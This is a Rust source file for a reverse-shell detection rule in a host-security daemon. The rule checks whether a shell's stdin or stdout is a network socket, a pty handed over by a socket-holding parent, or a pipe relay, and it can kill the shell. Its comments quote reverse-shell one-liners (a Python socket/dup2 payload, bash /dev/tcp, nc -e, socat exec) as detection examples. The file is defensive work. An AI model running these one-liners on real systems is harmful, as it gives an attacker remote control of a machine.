//! `moat-shell-stdio-socket` — a shell whose standard input or output IS a
//! network socket.
//!
//! ## The gap this fills (2026-09-05)
//!
//! `moat-shell-reverse-shell-connect` watches `tcp_connect` from a shell or a
//! netcat, which catches `bash -i >& /dev/tcp/host/port`, `nc -e` and
//! `socat exec:`. Two of the three reverse-shell shapes never call
//! `tcp_connect` from a shell at all:
//!
//! 1. **The interpreter reverse shell** — the most common shape in the wild:
//!
//!    ```text
//!    python -c 'import socket,os,subprocess
//!               s=socket.socket(); s.connect(("10.0.0.5",4444))
//!               os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
//!               subprocess.call(["/bin/sh","-i"])'
//!    ```
//!
//!    The *interpreter* connects; the shell only inherits the socket on fds
//!    0/1/2. `python` is not in the kernel policy's `matchBinaries`, and the
//!    shell it execs never touches the network — there is nothing for a
//!    `tcp_connect` rule to see. The perl/php/ruby/node/java one-liners are the
//!    same program with different syntax.
//!
//! 2. **The pty upgrade** — `python -c 'import pty;pty.spawn("/bin/bash")'` or
//!    `script /dev/null` run *inside* an existing reverse shell. The socket
//!    stays on the parent's stdio and the new shell gets a fresh `/dev/pts/N`,
//!    so even rung 1 below would miss it.
//!
//! And the kernel rule excludes RFC1918, loopback and link-local in-kernel
//! (`NotDAddr`), so a reverse shell to a LAN pivot never fired at all. Both of
//! the C2s used in this project's own lab were LAN hosts (192.168.44.122,
//! 192.168.1.14). **This rule does not care where the peer is**: a shell whose
//! stdio is a socket is a reverse shell whether the handler is in Bucharest or
//! on the desk. Only the *severity* moves (loopback → medium), and the evidence
//! says why.
//!
//! ## What it looks at
//!
//! Every `process_exec` whose basename is a shell, then `readlink` of
//! `/proc/<pid>/fd/{0,1,2}` of the **new** process. moatd runs as root, the
//! process table already reads `/proc/<pid>/stat` at exec time, and this is the
//! same window: a reverse shell is long-lived, so if `/proc/<pid>` is already
//! gone there was nothing to catch and the rule returns nothing.
//!
//! ## Why the parent's STDIO, and not "the parent holds a socket"
//!
//! Rung 2 asks whether the PARENT's fds 0/1/2 are a network socket, never
//! whether the parent holds a socket *somewhere*. Claude, VS Code, every
//! language server, every dev server and every browser holds dozens of sockets
//! and spawns shells all day long; "parent has a socket on fd 37" describes an
//! ordinary IDE, and a rule built on it would fire hundreds of times a day and
//! be switched off within an hour. Standard input is different: it is what a
//! process was *handed*, not what it went and opened, and a parent whose stdin
//! is a TCP connection was itself started by something on the far end of that
//! connection. That is the discriminator, and it is the whole rule.
//!
//! A unix socket on stdio is NOT this. `systemd` hands services a
//! `/run/systemd/journal/stdout` socket for stdout and stderr as a matter of
//! course, so every shell in every unit would match a naive "stdio is a socket"
//! test. Inodes that resolve in `/proc/net/unix` are dropped without a finding.
//!
//! ## Cost
//!
//! Three `readlink`s per shell exec, and nothing else in the common case:
//! `/proc/net/*` is only read once one of fds 0/1/2 actually is a socket, and
//! the parent's fds are only read when the shell's own stdio is a pty. A shell
//! whose stdin is a pipe or a terminal — every shell in a build, every
//! lifecycle script — costs three failed-fast link reads.
//!
//! ## Scoring
//!
//! The `shell` family is already in `scoring::NEVER_LOWERED`, so nothing here
//! needs to touch that file: provenance, context and the matrix cannot soften a
//! `shell` finding, which is exactly right for this one — a shell with a socket
//! on stdin is not less alarming because it is `/usr/bin/bash` from the official
//! repo, in an interactive session, started by a terminal.

use std::collections::HashMap;
use std::path::{Path, PathBuf};

use crate::config::Config;
use crate::event::ExecEvent;
use crate::explain::Finding;
use crate::incident::{parse_net, socket_inode_of, SocketRow};
use crate::policy::PolicyMeta;
use crate::rules::{meta, RuleCtx, UserRule};
use crate::util::basename;

pub const ID: &str = "moat-shell-stdio-socket";

/// Every shell a reverse-shell payload actually execs. Deliberately wider than
/// `LOGIN_SHELLS` (which is about "a person typed this"): `busybox sh` and
/// `ash` are what a stripped payload reaches for precisely because nobody
/// watches them, and `csh`/`tcsh` cost nothing to include.
const SHELLS: &[&str] = &[
    "bash", "sh", "dash", "zsh", "fish", "busybox", "ash", "ksh", "mksh", "tcsh", "csh",
];

/// The three descriptors that make a shell a shell. Nothing else is looked at:
/// see the module doc on why "holds a socket somewhere" is not a detection.
const STDIO: [u32; 3] = [0, 1, 2];

pub struct ShellStdioSocket {
    /// Injectable so tests can lay out `<root>/<pid>/fd/0 -> socket:[N]` and a
    /// fake `<root>/net/tcp` in a tempdir. Production always passes `/proc`.
    pub proc_root: PathBuf,
}

/// The default root. In a **test** build it is a path that does not exist, for
/// the same reason `proctable::observed_session` reads nothing under test: the
/// fixture pids (41230, 41233, …) belong to whatever happens to be running on
/// the machine under test, and a rule that reads the real `/proc` for them
/// would pass or fail depending on an unrelated process. Every test here builds
/// the struct with its own root; only `rules::all()` uses this.
#[cfg(not(test))]
const DEFAULT_PROC_ROOT: &str = "/proc";
#[cfg(test)]
const DEFAULT_PROC_ROOT: &str = "/nonexistent/proc-under-test";

impl Default for ShellStdioSocket {
    fn default() -> Self {
        ShellStdioSocket {
            proc_root: PathBuf::from(DEFAULT_PROC_ROOT),
        }
    }
}

/// What one of fds 0/1/2 points at.
#[derive(Debug, Clone, PartialEq, Eq)]
enum Target {
    /// `socket:[12345]` — any socket, family not yet known.
    Socket(u64),
    /// `/dev/pts/3`, `/dev/tty`, `/dev/ptmx`.
    Pty(String),
    /// A file, a pipe, `/dev/null`, anything else.
    Other(String),
}

/// `readlink /proc/<pid>/fd/{0,1,2}`, or `None` when `/proc/<pid>` is already
/// gone — the race this rule deliberately loses rather than guesses about.
fn stdio_targets(root: &Path, pid: u32) -> Option<Vec<(u32, Target)>> {
    let mut out = Vec::new();
    for fd in STDIO {
        let Ok(t) = std::fs::read_link(root.join(pid.to_string()).join("fd").join(fd.to_string()))
        else {
            continue;
        };
        let t = t.to_string_lossy().into_owned();
        let target = if let Some(inode) = socket_inode_of(&t) {
            Target::Socket(inode)
        } else if t.starts_with("/dev/pts/") || t == "/dev/tty" || t == "/dev/ptmx" {
            Target::Pty(t)
        } else {
            Target::Other(t)
        };
        out.push((fd, target));
    }
    // Not one of the three could be read: the process exited between the exec
    // event and this read (or never existed, in a test). Nothing to say.
    if out.is_empty() {
        None
    } else {
        Some(out)
    }
}

/// Every network socket the kernel knows about, keyed by inode, read from
/// `<root>/net/*`. `incident::socket_table` does the same against the real
/// `/proc`; this one takes a root so a fixture can drive it.
fn net_sockets(root: &Path) -> HashMap<u64, SocketRow> {
    let mut out = HashMap::new();
    for (proto, file) in [
        ("tcp", "tcp"),
        ("tcp6", "tcp6"),
        // udp is a fallback: a shell handed a UDP socket on stdio is not a
        // shape anybody uses, but "the inode was a socket and we could not say
        // which" is a worse answer than checking two more files.
        ("udp", "udp"),
        ("udp6", "udp6"),
    ] {
        let Ok(text) = std::fs::read_to_string(root.join("net").join(file)) else {
            continue;
        };
        for row in parse_net(proto, &text) {
            out.insert(row.inode, row);
        }
    }
    out
}

/// Is this inode a unix-domain socket? Field 7 (index 6) of `/proc/net/unix`
/// is the inode. See the module doc: journald's stdout socket is the reason
/// this check exists.
fn is_unix_socket(root: &Path, inode: u64) -> bool {
    let Ok(text) = std::fs::read_to_string(root.join("net").join("unix")) else {
        return false;
    };
    text.lines().skip(1).any(|line| {
        line.split_whitespace()
            .nth(6)
            .and_then(|f| f.parse::<u64>().ok())
            == Some(inode)
    })
}

/// `192.168.1.14:4444` / `[::1]:4444` -> (`192.168.1.14`, 4444).
/// `pipe:[12345]` -> 12345. Anything else is not a pipe.
fn pipe_inode(link: &str) -> Option<u64> {
    link.strip_prefix("pipe:[")?.strip_suffix(']')?.parse().ok()
}

/// Every fd a process holds, not just 0/1/2.
///
/// Rung 3 needs this on the PARENT to find a socket that is not on its stdio
/// and to prove it holds both ends of the shell's pipes. It is never used to
/// decide anything on its own -- see the shape rung 3 requires.
fn all_fd_targets(root: &Path, pid: u32) -> Option<Vec<(u32, Target)>> {
    let dir = root.join(pid.to_string()).join("fd");
    let mut out = Vec::new();
    for entry in std::fs::read_dir(&dir).ok()? {
        let Ok(entry) = entry else { continue };
        let Some(fd) = entry.file_name().to_str().and_then(|n| n.parse::<u32>().ok()) else {
            continue;
        };
        let Ok(t) = std::fs::read_link(entry.path()) else { continue };
        let t = t.to_string_lossy().to_string();
        let target = if let Some(inode) = t
            .strip_prefix("socket:[")
            .and_then(|r| r.strip_suffix(']'))
            .and_then(|n| n.parse::<u64>().ok())
        {
            Target::Socket(inode)
        } else if t.starts_with("/dev/pts/") || t == "/dev/tty" || t == "/dev/ptmx" {
            Target::Pty(t)
        } else {
            Target::Other(t)
        };
        out.push((fd, target));
    }
    Some(out)
}

/// Was this shell given something to run, or is it waiting to be told?
///
/// `-c` and a script operand both mean "here is the work". Everything else --
/// bare `bash`, `bash -i`, `bash -s`, `bash --noprofile --norc -s` -- means the
/// commands arrive from stdin, which is the half of a relay that matters.
fn waits_for_commands(args: &str) -> bool {
    for tok in args.split_whitespace() {
        if tok == "-c" || tok == "--command" {
            return false;
        }
        // A script operand: the first non-flag word. `-s` is explicitly "read
        // from stdin" and is a flag, not a script.
        if !tok.starts_with('-') {
            return false;
        }
        // Bundled short flags: `-ic` carries a -c.
        if !tok.starts_with("--") && tok.contains('c') {
            return false;
        }
    }
    true
}

fn split_peer(s: &str) -> Option<(String, u16)> {
    let (host, port) = s.rsplit_once(':')?;
    let host = host.trim_start_matches('[').trim_end_matches(']');
    Some((host.to_string(), port.parse().ok()?))
}

/// A peer on this machine. `0.0.0.0` / `::` is "no peer yet" (a listening or
/// unconnected socket), which is not loopback and stays critical.
///
/// The v4-mapped form matters: a socket opened on an `AF_INET6` listener to
/// 127.0.0.1 is recorded in `/proc/net/tcp6` as `::ffff:127.0.0.1`, and
/// `Ipv6Addr::is_loopback` is false for it. Without the second arm every local
/// test harness on a dual-stack listener would be reported as critical.
fn is_loopback(host: &str) -> bool {
    match host.parse::<std::net::IpAddr>() {
        Ok(std::net::IpAddr::V6(v6)) => {
            v6.is_loopback() || v6.to_ipv4_mapped().map(|v4| v4.is_loopback()).unwrap_or(false)
        }
        Ok(ip) => ip.is_loopback(),
        Err(_) => false,
    }
}

/// The socket on stdio, if there is one, with everything known about it.
struct StdioSocket {
    fds: Vec<u32>,
    inode: u64,
    row: Option<SocketRow>,
}

/// Was the socket simply GONE by the time we looked, rather than hidden from us?
///
/// An unresolvable inode has two causes and they deserve opposite answers:
///
/// * **It closed.** A reverse shell's socket stays open -- somebody is typing
///   into it; that is the whole point. A socket that has already gone is not a
///   live reverse shell, and treating it as one fires `critical` on every
///   short-lived `sh -c` whose stdio was a socketpair. Measured on this machine
///   2026-09-07: Claude Code's statusline spawns exactly that shape, 870 times
///   since 2026-09-03, and every one produced a critical false positive because
///   the pair closed inside the read window.
/// * **It is in another network namespace.** A shell in a container can have a
///   live network socket that never appears in the host's `/proc/net`. Here we
///   genuinely cannot tell, and the finding must stand.
///
/// So: same namespace as moatd means `/proc/net` WAS authoritative and the
/// socket is gone. A process that has exited is likewise no longer a live
/// anything. If our own namespace cannot be read -- a synthetic proc root in a
/// test, a stripped container -- nothing is proven and the finding stands,
/// which keeps the conservative default where the evidence is absent.
fn socket_is_gone_not_hidden(root: &Path, pid: u32) -> bool {
    let ours = std::fs::read_link(root.join("self").join("ns").join("net"));
    let Ok(ours) = ours else {
        return false; // cannot prove anything; keep the finding
    };
    match std::fs::read_link(root.join(pid.to_string()).join("ns").join("net")) {
        // Same namespace: /proc/net was the right place to look, and it was not
        // there, so it closed.
        Ok(theirs) => theirs == ours,
        // The process is gone. A dead shell is not a live reverse shell.
        Err(_) => true,
    }
}

impl StdioSocket {
    /// `None` when no fd in 0/1/2 is a socket, or when the only socket there is
    /// a unix socket (journald's stdout, a service's own control socket): not
    /// this rule, and saying so out loud is the point of the comment.
    fn find(root: &Path, pid: u32, targets: &[(u32, Target)]) -> Option<StdioSocket> {
        let sockets: Vec<(u32, u64)> = targets
            .iter()
            .filter_map(|(fd, t)| match t {
                Target::Socket(i) => Some((*fd, *i)),
                _ => None,
            })
            .collect();
        if sockets.is_empty() {
            return None;
        }
        // Look in the PROCESS's network namespace, not only our own.
        //
        // `/proc/<pid>/net/*` is the socket table as that process sees it, so a
        // shell inside a container is resolved against its container's table.
        // Without this, every containerised shell landed in the "belongs to
        // another network namespace" branch, which by design keeps the finding:
        // measured overnight 2026-09-08, sixteen CRITICAL alerts, all of them
        // npm postinstalls (`prebuild-install || node-gyp rebuild`) inside
        // image builds, each with a socketpair on stdio that had already closed.
        //
        // moatd is root, so the per-process table is readable. Falling back to
        // our own keeps the synthetic-proc tests working and costs nothing:
        // for a host process the two files are the same table.
        let mut net = net_sockets(&root.join(pid.to_string()));
        // Whether we managed to read the process's OWN table decides what an
        // unresolvable inode means below.
        let own_table = !net.is_empty();
        if net.is_empty() {
            net = net_sockets(root);
        }
        // Prefer an fd whose inode resolves to a network socket; a process can
        // legitimately have journald's unix socket on stderr and the C2 on
        // stdin at the same time.
        let chosen = sockets
            .iter()
            .find(|(_, i)| net.contains_key(i))
            .copied()
            .unwrap_or(sockets[0]);
        // Same namespace lesson as the table above: a containerised shell's
        // unix socket lives in ITS /proc/net/unix, not ours. Ask the process's
        // own table first, or journald-shaped stdio inside a container reads as
        // "resolved nowhere" for a reason that has nothing to do with the file.
        let unix_here = is_unix_socket(&root.join(pid.to_string()), chosen.1)
            || is_unix_socket(root, chosen.1);
        if !net.contains_key(&chosen.1) && unix_here {
            return None;
        }
        // Neither a network socket nor a unix one: it resolved nowhere. Drop it
        // only when we can PROVE it is gone rather than hidden -- see
        // `socket_is_gone_not_hidden`. This overturns a deliberate earlier
        // choice (`an_unresolvable_socket_inode_is_still_critical`), on the
        // evidence that the choice fires critical on every short-lived shell
        // with a socketpair on stdio and never on a real reverse shell, whose
        // socket is by definition still open.
        // Gone, not hidden -- and since 2026-09-08 there is a second way to
        // know that. If we read the process's OWN socket table and the inode is
        // not in it, the socket is gone in the only namespace that could have
        // held it, whatever namespace that was. That is what retires the
        // "belongs to another network namespace" excuse for containerised
        // shells, which was sixteen critical false positives in one night.
        if !net.contains_key(&chosen.1) && (own_table || socket_is_gone_not_hidden(root, pid)) {
            return None;
        }
        Some(StdioSocket {
            fds: sockets.iter().map(|(fd, _)| *fd).collect(),
            inode: chosen.1,
            row: net.get(&chosen.1).cloned(),
        })
    }

    /// `critical`, or `medium` when the peer is on this machine.
    fn severity(&self) -> &'static str {
        match self.row.as_ref().and_then(|r| split_peer(&r.remote)) {
            Some((host, _)) if is_loopback(&host) => "medium",
            _ => "critical",
        }
    }

    fn peer_line(&self) -> String {
        match &self.row {
            Some(r) => format!(
                "the socket is {} {} -> {} ({}), inode {}",
                r.proto,
                r.local,
                r.remote,
                if r.state.is_empty() { "no state" } else { &r.state },
                self.inode
            ),
            None => format!(
                "socket inode {} is in none of /proc/net/{{tcp,tcp6,udp,udp6,unix}} — it closed \
                 between the exec and this read, or it belongs to another network namespace. The \
                 fd IS a socket, which is the finding; the peer is simply not known",
                self.inode
            ),
        }
    }

    fn fds_line(&self) -> String {
        let names: Vec<&str> = self
            .fds
            .iter()
            .map(|fd| match fd {
                0 => "stdin",
                1 => "stdout",
                _ => "stderr",
            })
            .collect();
        format!(
            "fd {} ({}) of this process is a socket",
            self.fds
                .iter()
                .map(|f| f.to_string())
                .collect::<Vec<_>>()
                .join(", "),
            names.join(", ")
        )
    }
}

impl ShellStdioSocket {
    /// Rung 1: the shell's own stdio is a network socket.
    fn direct(&self, exec_id: &str, ctx: &RuleCtx, targets: &[(u32, Target)]) -> Option<Finding> {
        let me = ctx.table.get(exec_id)?;
        let sock = StdioSocket::find(&self.proc_root, me.pid, targets)?;
        let severity = sock.severity();
        let mut f = ctx.finding(ID, self.meta(), exec_id)?;
        f.meta.severity = severity.to_string();
        f.hook = "userland: exec with a socket on standard input or output".into();

        let me = f.proc.clone();
        f.what_override = Some(format!(
            "{} ({}) started with its standard input or output connected to a network socket{}.",
            basename(&me.exe),
            me.exe,
            match sock.row.as_ref().map(|r| r.remote.clone()) {
                Some(peer) => format!(" to {}", peer),
                None => String::new(),
            }
        ));

        let mut evidence = vec![sock.fds_line(), sock.peer_line()];
        if severity == "medium" {
            evidence.push(
                "the peer is on this machine (loopback), so this is medium rather than critical: \
                 a local socket on stdio is how some test harnesses and inetd-style wrappers run. \
                 A reverse shell to a LAN or public host is critical and is not softened by \
                 anything"
                    .to_string(),
            );
        }
        evidence.push(format!("started by: {}", ctx.table.ancestry_line(exec_id)));
        f.extra_evidence = evidence;

        if let Some((ip, port)) = sock.row.as_ref().and_then(|r| split_peer(&r.remote)) {
            f.net = Some(crate::alert::NetRef {
                dst_ip: ip,
                dst_port: port,
                // No DNS anywhere in moat (NOTES gap 4), and this destination
                // never went through a resolver we can see.
                domain: None,
            });
        }
        self.arm(&mut f, ctx);
        Some(f)
    }

    /// Rung 2: the shell got a pty, and the PARENT's stdio is the socket — the
    /// `pty.spawn` / `script /dev/null` upgrade. Same rule id: it is the same
    /// finding one step later.
    fn pty_upgrade(&self, exec_id: &str, ctx: &RuleCtx, targets: &[(u32, Target)]) -> Option<Finding> {
        if !targets.iter().any(|(_, t)| matches!(t, Target::Pty(_))) {
            return None;
        }
        let parent = ctx.table.ancestry(exec_id).first().copied()?.clone();
        let ptargets = stdio_targets(&self.proc_root, parent.pid)?;
        let sock = StdioSocket::find(&self.proc_root, parent.pid, &ptargets)?;

        let mut f = ctx.finding(ID, self.meta(), exec_id)?;
        f.meta.severity = "high".into();
        f.hook = "userland: exec on a pty whose parent's stdio is a socket".into();
        f.what_override = Some(format!(
            "{} was given a pty by {} (pid {}), whose own standard input is a network socket.",
            basename(&f.proc.exe),
            basename(&parent.exe),
            parent.pid
        ));
        f.extra_evidence = vec![
            format!(
                "this process's fds 0/1/2 are a pty: {}",
                targets
                    .iter()
                    .filter_map(|(fd, t)| match t {
                        Target::Pty(p) => Some(format!("fd {} -> {}", fd, p)),
                        _ => None,
                    })
                    .collect::<Vec<_>>()
                    .join(", ")
            ),
            format!(
                "the parent's standard input is a network socket; this shell was given a pty over \
                 it (pty.spawn / script). Parent {} (pid {}): {}",
                parent.exe,
                parent.pid,
                sock.fds_line()
            ),
            sock.peer_line(),
            "only the parent's fds 0/1/2 are looked at, never the sockets it holds elsewhere: \
             every editor, language server and dev server holds sockets and spawns shells"
                .to_string(),
            format!("started by: {}", ctx.table.ancestry_line(exec_id)),
        ];
        if let Some((ip, port)) = sock.row.as_ref().and_then(|r| split_peer(&r.remote)) {
            f.net = Some(crate::alert::NetRef {
                dst_ip: ip,
                dst_port: port,
                domain: None,
            });
        }
        self.arm(&mut f, ctx);
        Some(f)
    }

    /// Rung 3: the shell talks through PIPES to a parent that holds the socket.
    ///
    /// This is the shape rungs 1 and 2 cannot see, and the one that got through
    /// on 2026-09-10: `node` with `spawn(bash, {stdio: ['pipe','pipe','pipe']})`
    /// and `openssl s_client` relaying through a fifo. The shell's own fds are
    /// pipes, so rung 1 finds no socket; it has no pty, so rung 2 does not
    /// apply. The socket is on the PARENT, on some fd that is not 0/1/2.
    ///
    /// Rung 2 refuses to look at a parent's non-stdio fds on purpose -- "every
    /// editor, language server and dev server holds sockets and spawns shells"
    /// -- and that reasoning is still right. What makes this rung safe is not
    /// looking harder, it is requiring a shape those processes do not have:
    ///
    /// * **Both directions.** fd 0 AND fd 1 are pipes, and the PARENT holds
    ///   both of those same pipe inodes. That is a two-way channel between the
    ///   shell and the thing holding the socket. `curl … | bash` -- the pattern
    ///   this would otherwise drown in -- fails here: curl feeds the shell's
    ///   stdin, but the shell's stdout is the terminal, so the loop is open.
    /// * **No command.** The shell was given nothing to run: no `-c`, no script
    ///   operand. It is waiting for instructions from that pipe. An editor or a
    ///   build tool runs `bash -c '…'` or `bash script.sh`; a relay runs
    ///   `bash -i` or `bash -s` or bare `bash`, because the commands are coming
    ///   over the wire.
    /// * **A real peer.** The parent's socket resolves to a non-loopback
    ///   address. A language server talking to 127.0.0.1 is not this.
    ///
    /// All three, or nothing. Any one of them alone is ordinary.
    fn pipe_relay(&self, exec_id: &str, ctx: &RuleCtx, targets: &[(u32, Target)]) -> Option<Finding> {
        let pipe_of = |want: u32| -> Option<u64> {
            targets.iter().find_map(|(fd, t)| match t {
                Target::Other(p) if *fd == want => pipe_inode(p),
                _ => None,
            })
        };
        // Both directions, or this is a pipeline and not a channel.
        let (in_pipe, out_pipe) = (pipe_of(0)?, pipe_of(1)?);

        // A shell that was handed a command is doing a job, not waiting for one.
        let me = ctx.table.get(exec_id)?;
        if !waits_for_commands(&me.args) {
            return None;
        }

        let parent = ctx.table.ancestry(exec_id).first().copied()?.clone();
        let pfds = all_fd_targets(&self.proc_root, parent.pid)?;

        // The parent must hold BOTH ends. Holding one is a pipeline stage.
        let holds = |inode: u64| {
            pfds.iter().any(|(_, t)| match t {
                Target::Other(p) => pipe_inode(p) == Some(inode),
                _ => false,
            })
        };
        if !holds(in_pipe) || !holds(out_pipe) {
            return None;
        }

        // And a socket to somewhere real. `find` prefers an fd that resolves in
        // the process's own namespace, which is what makes this work inside a
        // container as well as outside.
        let sock = StdioSocket::find(&self.proc_root, parent.pid, &pfds)?;
        let (ip, port) = sock.row.as_ref().and_then(|r| split_peer(&r.remote))?;
        if is_loopback(&ip) {
            return None;
        }

        let mut f = ctx.finding(ID, self.meta(), exec_id)?;
        f.meta.severity = "critical".into();
        f.hook = "userland: shell on pipes to a parent holding a remote socket".into();
        f.what_override = Some(format!(
            "{} was started with no command, reading and writing through pipes held by {} \
             (pid {}), which has a socket open to {}:{}.",
            basename(&f.proc.exe),
            basename(&parent.exe),
            parent.pid,
            ip,
            port
        ));
        f.extra_evidence = vec![
            format!(
                "this shell's stdin and stdout are both pipes ({}, {}), and {} (pid {}) holds \
                 both ends -- a two-way channel, not a pipeline",
                in_pipe, out_pipe, parent.exe, parent.pid
            ),
            format!(
                "it was given no command to run ({}), so it is waiting for instructions from \
                 that pipe",
                if me.args.trim().is_empty() { "no arguments".to_string() } else { me.args.clone() }
            ),
            sock.peer_line(),
            "all three had to hold at once: both pipe directions shared with the parent, no \
             command, and a non-loopback peer. `curl … | bash` fails the first (its stdout is \
             the terminal) and an editor running `bash -c` fails the second"
                .to_string(),
            format!("started by: {}", ctx.table.ancestry_line(exec_id)),
        ];
        f.net = Some(crate::alert::NetRef {
            dst_ip: ip,
            dst_port: port,
            domain: None,
        });
        self.arm(&mut f, ctx);
        Some(f)
    }

    /// Enforcement, the way `moat-pkg-subtree-netcat-exec` does it: the rule
    /// asks, the engine verifies the pid's start time and signals.
    ///
    /// Only the **critical** rung asks. A `medium` finding is a loopback peer
    /// and a `high` one is the pty rung, where the evidence is one process
    /// removed; killing on either would mean this rule's weakest cases are also
    /// its most destructive ones. In monitor mode nothing is killed and the
    /// alert says how to do it by hand; in enforce mode the engine appends the
    /// outcome, because it is the half that knows whether the signal landed.
    fn arm(&self, f: &mut Finding, ctx: &RuleCtx) {
        if f.meta.severity != "critical" {
            return;
        }
        // The daemon-wide mode, or this one rule armed on its own
        // (`moatctl set mode enforce --rule moat-shell-stdio-socket`).
        if ctx.enforcing(ID) {
            f.request_kill = true;
        } else {
            f.extra_evidence.push(format!(
                "monitor mode: nothing was killed. `moatctl kill <id>` stops it, or arm this one \
                 rule with `moatctl set mode enforce --rule {}`",
                ID
            ));
        }
    }
}

impl UserRule for ShellStdioSocket {
    fn id(&self) -> &'static str {
        ID
    }

    fn enabled(&self, cfg: &Config) -> bool {
        cfg.rules.shell_stdio_socket
    }

    fn meta(&self) -> PolicyMeta {
        let mut m = meta(
            ID,
            "shell",
            "critical",
            "Shell started with its input or output connected to a network socket",
            "A shell reads commands from its standard input and writes to its standard output. \
             When those are a TCP connection instead of a terminal, whoever is on the other end \
             of that connection is typing into this machine — that is the definition of a reverse \
             shell, and it is true whether the handler is on the internet or on your LAN. The \
             common interpreter one-liners (python/perl/php/ruby/node) never make the shell itself \
             connect: the interpreter connects, dup2s the socket onto fds 0, 1 and 2, and execs \
             /bin/sh, which is invisible to any rule watching for a shell calling connect().",
            "Rare and deliberate: an inetd-style service that hands a socket to a script, a test \
             harness driving a shell over a local socket (loopback peers are reported at medium \
             for exactly this reason), and container tooling that wires a shell to a stream. Unix \
             sockets on stdio — journald's stdout socket, which systemd gives every service — are \
             not this and never fire. Ignore by parent once you recognise the wrapper.",
            &[],
            &["kill", "quarantine", "ignore"],
            "parent",
        );
        // What arming this rule DOES, in the same word a kernel policy uses, so
        // `enforceable()` can offer it and the Rules tab can say `kill` next to
        // it. The killing happens in the daemon (`maybe_enforce`), not in the
        // kernel, and only on the `critical` rung — see `arm`.
        m.enforce = "kill".into();
        m
    }

    fn on_exec(&mut self, _ev: &ExecEvent, exec_id: &str, ctx: &RuleCtx) -> Vec<Finding> {
        let Some(me) = ctx.table.get(exec_id) else {
            return Vec::new();
        };
        if !SHELLS.contains(&basename(&me.exe)) {
            return Vec::new();
        }
        let pid = me.pid;
        // The race: a reverse shell is long-lived, so a /proc that is already
        // gone means there was nothing to catch. Guessing from the event alone
        // would be a claim about fds nobody read.
        let Some(targets) = stdio_targets(&self.proc_root, pid) else {
            return Vec::new();
        };
        if let Some(f) = self.direct(exec_id, ctx, &targets) {
            return vec![f];
        }
        if let Some(f) = self.pty_upgrade(exec_id, ctx, &targets) {
            return vec![f];
        }
        self.pipe_relay(exec_id, ctx, &targets).into_iter().collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::feeds::Feeds;
    use crate::proctable::ProcTable;
    use crate::rules::testkit::{cfg, proc};
    use std::os::unix::fs::symlink;

    /// `192.168.1.20:51234 -> 192.168.1.14:4444`, ESTABLISHED, inode 90001.
    const LAN_ROW: &str =
        "   0: 1401A8C0:C822 0E01A8C0:115C 01 00000000:00000000 00:00000000 00000000  1000        0 90001 1 0000000000000000 20 4 30 10 -1";
    /// `127.0.0.1:51235 -> 127.0.0.1:4444`, ESTABLISHED, inode 90002.
    const LOOPBACK_ROW: &str =
        "   1: 0100007F:C823 0100007F:115C 01 00000000:00000000 00:00000000 00000000  1000        0 90002 1 0000000000000000 20 4 30 10 -1";
    /// `[::ffff:127.0.0.1]:51236 -> [::ffff:127.0.0.1]:4444`, inode 90004 — the
    /// shape a dual-stack listener produces for a local connection, and the one
    /// `Ipv6Addr::is_loopback` alone gets wrong.
    const V6_MAPPED_LOOPBACK_ROW: &str =
        "   0: 0000000000000000FFFF00000100007F:C824 0000000000000000FFFF00000100007F:115C 01 00000000:00000000 00:00000000 00000000  1000        0 90004 1 0000000000000000 20 4 30 10 -1";
    const TCP_HEADER: &str =
        "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode";

    /// A /proc root with the rows above in `net/tcp` and `net/tcp6`, and one
    /// unix socket (inode 90003) in `net/unix`.
    fn proc_root(dir: &Path) {
        std::fs::create_dir_all(dir.join("net")).unwrap();
        std::fs::write(
            dir.join("net/tcp"),
            format!("{}\n{}\n{}\n", TCP_HEADER, LAN_ROW, LOOPBACK_ROW),
        )
        .unwrap();
        std::fs::write(
            dir.join("net/tcp6"),
            format!("{}\n{}\n", TCP_HEADER, V6_MAPPED_LOOPBACK_ROW),
        )
        .unwrap();
        std::fs::write(
            dir.join("net/unix"),
            "Num       RefCount Protocol Flags    Type St Inode Path\n\
             ffff9a0000000000: 00000003 00000000 00000000 0001 03 90003 /run/systemd/journal/stdout\n",
        )
        .unwrap();
    }

    /// Point fds 0, 1 and 2 of `pid` at these three targets under the fake root.
    fn fds(dir: &Path, pid: u32, zero: &str, one: &str, two: &str) {
        let fd = dir.join(pid.to_string()).join("fd");
        std::fs::create_dir_all(&fd).unwrap();
        symlink(zero, fd.join("0")).unwrap();
        symlink(one, fd.join("1")).unwrap();
        symlink(two, fd.join("2")).unwrap();
    }

    /// `alacritty -> bash(pid 5100)`, and a python (pid 5200) with a bash
    /// (pid 5201) under it for the pty rung.
    fn table() -> ProcTable {
        let mut t = ProcTable::new(8, 60);
        t.observe(&proc("e-term", 5000, "/usr/bin/alacritty", "", None));
        t.observe(&proc("e-bash", 5100, "/usr/bin/bash", "-i", Some("e-term")));
        t.observe(&proc("e-py", 5200, "/usr/bin/python3", "-c import pty", Some("e-term")));
        t.observe(&proc("e-bash2", 5201, "/usr/bin/bash", "", Some("e-py")));
        t.observe(&proc("e-curl", 5300, "/usr/bin/curl", "https://x", Some("e-term")));
        // Rung 3: node holding a socket, with a bash on pipes under it.
        t.observe(&proc("e-node", 5400, "/usr/bin/node", "worker.mjs", Some("e-term")));
        t.observe(&proc("e-bash3", 5401, "/usr/bin/bash", "--noprofile --norc -s", Some("e-node")));
        // The control it must not catch: the same node, but the shell was
        // handed a command, which is what every build tool does.
        t.observe(&proc("e-bash4", 5402, "/usr/bin/bash", "-c npm run build", Some("e-node")));
        t
    }

    /// Give `pid` an arbitrary set of fds under the fake root.
    fn fds_many(dir: &Path, pid: u32, links: &[(u32, &str)]) {
        let fd = dir.join(pid.to_string()).join("fd");
        std::fs::create_dir_all(&fd).unwrap();
        for (n, target) in links {
            symlink(target, fd.join(n.to_string())).unwrap();
        }
    }

    /// The shape that got through on 2026-09-10: node relaying between a socket
    /// and a shell it talks to over pipes. Rung 1 sees no socket on the shell,
    /// rung 2 sees no pty, and the connection is real.
    #[test]
    fn a_shell_on_pipes_to_a_parent_holding_the_socket_is_caught() {
        let dir = tempfile::tempdir().unwrap();
        proc_root(dir.path());
        fds(dir.path(), 5401, "pipe:[7001]", "pipe:[7002]", "pipe:[7002]");
        // node: both pipe ends, plus the LAN socket on a high fd.
        fds_many(dir.path(), 5400, &[
            (0, "/dev/pts/3"), (1, "/dev/pts/3"), (2, "/dev/pts/3"),
